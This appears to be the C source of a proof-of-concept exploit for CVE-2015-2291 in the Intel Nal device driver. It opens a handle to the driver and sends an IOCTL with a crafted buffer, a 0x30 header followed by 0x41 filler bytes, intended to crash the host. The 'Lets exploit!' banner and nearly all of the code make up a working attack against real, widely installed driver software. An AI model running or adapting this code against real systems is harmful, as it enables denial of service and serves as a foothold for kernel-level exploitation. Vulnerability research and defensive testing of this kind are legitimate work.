#include "exploit.h"

int main(int argc, char** argv)
{
	HANDLE h_nal = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned char unused = 0, input[2048], output[2048];
	unsigned long bytes_returned = 0;

	RtlSecureZeroMemory(&input, sizeof(input));
	RtlSecureZeroMemory(&output, sizeof(output));

	SetConsoleTitleA("CVE-2015-2291");

	printf("[*] CVE-2015-2291 Intel Nal Device Driver Exploit\n[*] Written by ExAllocatePool2\n[!] Lets exploit!");

	if (h_nal == (HANDLE)-1)
	{
		printf("\n[-] Unable to obtain a driver handle to the Nal device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a driver handle to the Nal device driver. Handle Value: 0x%p", h_nal);

	crash_test_case(h_nal, &input, sizeof(input), &output, sizeof(output), &bytes_returned);

	printf("\n[+] Exploit completed.");
	unused = getchar();
	return 0;
}

void crash_test_case(HANDLE h_nal, unsigned char* input, unsigned long long input_length, unsigned char* output, unsigned long long output_length, unsigned long* bytes_returned)
{
	printf("\n[!] Sending crash test case buffer...");
	*(long long*)(input) = 0x30;
	memset((long long*)(input + 8), 0x41, input_length - 8);
	DeviceIoControl(h_nal, TARGET_IOCTL, input, input_length, output, output_length, bytes_returned, 0);

	return;
}